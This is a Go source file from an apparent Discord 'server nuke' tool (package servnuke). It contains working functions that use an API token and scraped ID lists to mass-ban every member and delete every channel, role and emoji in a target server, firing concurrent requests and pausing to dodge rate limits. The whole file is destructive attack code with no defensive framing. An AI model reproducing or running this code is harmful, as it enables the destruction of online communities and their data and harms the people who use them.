package servnuke

import (
	"sync"
	"time"
)

var (
	wg sync.WaitGroup
)

func BanAll(guild string, token string) {
	members := GetData("./scraped/members.txt")
	for i, member := range members {
		if i%49 == 0 {
			time.Sleep(1 * time.Second)
		}
		wg.Add(1)
		url := "https://discord.com/api/v8/guilds/" + guild + "/bans/" + member
		go Request("PUT", url, token, &wg, "Member", member)
	}
	wg.Wait()
}

func DelChannels(guild string, token string) {
	channels := GetData("./scraped/channels.txt")
	for _, channel := range channels {
		wg.Add(1)
		url := "https://discord.com/api/v8/channels/" + channel
		go Request("DELETE", url, token, &wg, "Channel", channel)
	}
	wg.Wait()
}
func DelRoles(guild string, token string) {
	roles := GetData("./scraped/roles.txt")
	for _, role := range roles {
		wg.Add(1)
		url := "https://discord.com/api/v8/guilds/" + guild + "/roles/" + role
		go Request("DELETE", url, token, &wg, "Role", role)
	}
	wg.Wait()
}
func DelEmojis(guild string, token string) {
	emojis := GetData("./scraped/emojis.txt")
	for _, emoji := range emojis {
		wg.Add(1)
		url := "https://discord.com/api/v8/guilds/" + guild + "/emojis/" + emoji
		go Request("DELETE", url, token, &wg, "Emoji", emoji)
	}
	wg.Wait()
}
